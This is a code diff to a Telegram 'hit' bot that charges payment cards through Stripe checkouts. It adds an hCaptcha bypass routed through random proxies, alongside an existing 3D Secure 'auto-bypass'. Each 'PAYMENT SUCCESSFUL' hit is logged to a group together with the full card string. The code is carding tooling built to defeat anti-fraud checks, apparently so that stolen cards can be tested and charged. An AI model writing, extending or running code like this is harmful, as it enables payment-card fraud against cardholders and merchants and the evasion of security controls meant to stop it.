@@ -326,6 +326,15 @@ async def hit_command(message: types.Message):
         elif data["status"] == "progress":
             res = data["result"]
             
+            # Attempt Stripe Captcha Bypass if hCaptcha / rqdata detected
+            from stripe_captcha_bypasser import StripeCaptchaBypasser
+            if not res.get('success') and StripeCaptchaBypasser.is_captcha_triggered(res):
+                try:
+                    px_data = await ProxyManager.get_random(user_id)
+                    res = await StripeCaptchaBypasser.bypass_captcha(res, proxy_data=px_data)
+                except Exception:
+                    pass
+
             # Attempt Stripe 3DS Auto-Bypass if 3DS / authentication_required detected
             if not res.get('success') and (res.get('decline_code') in ('authentication_required', '3d_secure', 'challenge_required') or res.get('status') == 'requires_action' or (isinstance(res.get('raw_response'), dict) and res.get('raw_response', {}).get('status') == 'requires_action')):
                 try:
@@ -383,6 +392,7 @@ async def hit_command(message: types.Message):
                         escaped_receipt = html.escape(receipt_url) if receipt_url else ""
                         receipt_line = f"\n🧾 Receipt: <a href='{escaped_receipt}'>{escaped_receipt}</a>" if escaped_receipt else ""
                         tds_bypassed_line = "\n🔓 3DS: <b>BYPASSED</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
+                        cpt_bypassed_line = "\n🤖 Captcha: <b>BYPASSED</b>" if res.get('captcha_bypassed') else ""
                         log_text = (
                             f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
                             f"💳 <code>{card_str}</code>\n"
@@ -391,6 +401,7 @@ async def hit_command(message: types.Message):
                             f"👤 User: {message.from_user.first_name}\n"
                             f"⏱ {res['response_time']:.2f}s"
                             f"{tds_bypassed_line}"
+                            f"{cpt_bypassed_line}"
                             f"{receipt_line}"
                         )
                         await bot.send_message(LOG_GROUP_ID, log_text)
@@ -457,6 +468,7 @@ async def hit_command(message: types.Message):
                     escaped_receipt = html.escape(receipt_url) if receipt_url else ""
                     receipt_line = f"\n🧾 Receipt: <a href='{escaped_receipt}'>{escaped_receipt}</a>" if escaped_receipt else ""
                     tds_line = "\n🔓 3DS: <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
+                    cpt_line = "\n🤖 Captcha: <b>BYPASSED [STRIPE]</b>" if res.get('captcha_bypassed') else ""
                     note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
                     hit_text = (
                         f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
@@ -465,6 +477,7 @@ async def hit_command(message: types.Message):
                         f"🛒 Merchant: {merchant_name}\n"
                         f"⏱ {res['response_time']:.2f}s"
                         f"{tds_line}"
+                        f"{cpt_line}"
                         f"{receipt_line}" + note_line
                     )
                 else:
